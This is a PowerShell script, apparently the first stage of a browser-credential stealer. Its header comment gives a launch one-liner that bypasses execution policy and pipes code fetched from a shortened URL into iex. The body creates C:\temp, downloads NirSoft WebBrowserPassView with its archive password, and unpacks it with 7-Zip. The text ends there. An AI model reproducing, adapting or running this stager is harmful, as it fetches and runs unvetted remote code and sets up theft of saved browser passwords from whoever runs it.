<# 

______________________________________________________________________________________________

888      d888                             888          d8888                            d8888  
888     d8888                             888         d8P888                           d8P888  
888       888                             888        d8P 888                          d8P 888  
88888b.   888   .d88b.           88888b.  88888b.   d8P  888  888d888 88888b.d88b.   d8P  888  
888 "88b  888  d88P"88b          888 "88b 888 "88b d88   888  888P"   888 "888 "88b d88   888  
888  888  888  888  888          888  888 888  888 8888888888 888     888  888  888 8888888888 
888 d88P  888  Y88b 888          888 d88P 888  888       888  888     888  888  888       888  
88888P" 8888888 "Y88888 88888888 88888P"  888  888       888  888     888  888  888       888  
                    888          888                                                           
               Y8b d88P          888                                                           
                "Y88P"           888                                                           
______________________________________________________________________________________________


Invoke stage1.ps1 via windows : 
powershell -NoP -Ep Bypass ;irm https://shorturl.at/ | iex


#>



# Function to handle the temporary directory
function TempDir {
    # Check if the C:\temp directory exists
    if (Test-Path -Path "C:\temp" -PathType Container) {
        # The folder exists

        # Check if the current directory is C:\temp
        if (-not (Get-Location).Path -eq "C:\temp") {
            # If not, change the directory
            Set-Location -Path "C:\temp"
        }
    } else {
        # The folder does not exist, create it, and change the directory
        New-Item -Path "C:\" -Name "temp" -ItemType Directory
        Set-Location -Path "C:\temp"
    }
}

# Function to download Nirsoft tools
function Get-Nirsoft {
    $zipPassword = 'wbpv28821@'  # Archive password
    Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
    Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
    Expand-Archive 7z.zip
    .\7z\7za.exe e wbpv.zip
}

